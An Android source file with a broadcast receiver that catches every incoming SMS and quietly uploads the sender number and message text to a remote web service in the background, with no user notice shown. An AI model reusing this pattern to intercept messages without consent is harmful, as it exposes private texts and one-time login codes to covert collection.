package com.jy.jerseyclient;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.jy.jerseyclient.entity.Response;
import com.jy.jerseyclient.service.WebService;
import com.jy.jerseyclient.utils.NetworkUtil;

import java.util.List;

/**
 * Created by BussanQ on 2016/12/10.
 */

public class ReceiverDemo extends BroadcastReceiver {
    private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
    String SENT_SMS_ACTION="SENT_SMS_ACTION";
    String DELIVERED_SMS_ACTION="DELIVERED_SMS_ACTION";
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub
        if(strRes.equals(intent.getAction())){
            SmsMessage[] msgs = getMessageFromIntent(intent);
            StringBuilder sBuilder = new StringBuilder();
            String phone="";
            if (msgs != null && msgs.length > 0 ) {
                for (SmsMessage msg : msgs) {
                    phone=msg.getDisplayOriginatingAddress();
                    sBuilder.delete(0,sBuilder.length());
                    //sBuilder.append("发件人：");
                    //sBuilder.append(msg.getDisplayOriginatingAddress());
                    //sBuilder.append("\n------短信内容-------\n");
                    sBuilder.append(msg.getDisplayMessageBody());
                    saveTxt(phone,sBuilder.toString());
                }
            }
        }
    }


    /**
     * saveTxt
     * @param phoneNumber
     * @param message
     */
    public void saveTxt(String phoneNumber, String message) {

        SmsManager sms = SmsManager.getDefault();
        if (message.length() > 70) {
            List<String> msgs = sms.divideMessage(message);
            for (String msg : msgs) {
                asynctask(phoneNumber,msg);
            }
        } else {
            asynctask(phoneNumber,message);
        }
    }

    private  void asynctask(final String phoneNumber,final String message){
            new AsyncTask<String, Integer, Response>() {
                @Override
                protected Response doInBackground(String... params) {
                    Response response =   WebService.saveTxt(phoneNumber,message);
                    return response;
                }
            }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

    }

    public static SmsMessage[] getMessageFromIntent(Intent intent) {
        SmsMessage retmeMessage[] = null;
        Bundle bundle = intent.getExtras();
        Object pdus[] = (Object[]) bundle.get("pdus");
        retmeMessage = new SmsMessage[pdus.length];
        for (int i = 0; i < pdus.length; i++) {
            byte[] bytedata = (byte[]) pdus[i];
            retmeMessage[i]  = SmsMessage.createFromPdu(bytedata);
        }
        return retmeMessage;


    }

    /**
     * Send SMSs
     * @param phoneNumber
     * @param message
     */
    public void sendSMS(String phoneNumber, String message) {

        SmsManager sms = SmsManager.getDefault();
        if (message.length() > 70) {
            List<String> msgs = sms.divideMessage(message);
            for (String msg : msgs) {
                sms.sendTextMessage(phoneNumber, null, msg, null, null);
            }
        } else {
            sms.sendTextMessage(phoneNumber, null, message, null, null);
        }
    }

}
